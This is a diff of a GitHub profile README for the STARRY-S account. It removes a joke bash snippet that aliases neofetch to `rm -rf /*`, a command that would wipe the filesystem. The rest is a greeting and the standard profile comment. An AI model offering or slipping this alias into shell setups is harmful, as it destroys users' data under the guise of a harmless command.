@@ -1,9 +1,5 @@
 ### Hi there 👋
 
-``` bash
-alias neofetch="rm -rf /*"
-```
-
 <!--
 **STARRY-S/STARRY-S** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
 
